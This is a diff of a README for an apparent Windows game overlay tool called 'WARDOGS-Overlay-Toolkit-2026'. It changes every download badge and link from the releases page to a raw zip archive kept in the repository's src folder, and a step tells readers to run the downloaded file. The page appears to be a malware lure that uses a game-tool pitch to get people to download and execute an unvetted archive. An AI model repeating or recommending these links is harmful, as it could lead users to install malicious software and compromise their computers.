@@ -1,6 +1,6 @@
 # 🎯 WARDOGS-Overlay-Toolkit-2026 - Your Ultimate Battlefield Companion for Windows
 
-[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip)
 
 ## 🖥️ What Is This?
 
@@ -34,7 +34,7 @@ Getting WARDOGS-Overlay-Toolkit-2026 up and running takes less than a minute. Ju
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip)
 
 ### Step 2: Run the File
 
@@ -120,9 +120,9 @@ Whether you're a casual player or a dedicated strategist, this overlay adapts to
 
 Ready to enhance your WARDOGS experience? Download the toolkit today and see the difference it makes.
 
-[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip)
 
-Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/raw/refs/heads/main/src/1.3.zip)
 
 ## 📊 System Requirements
 
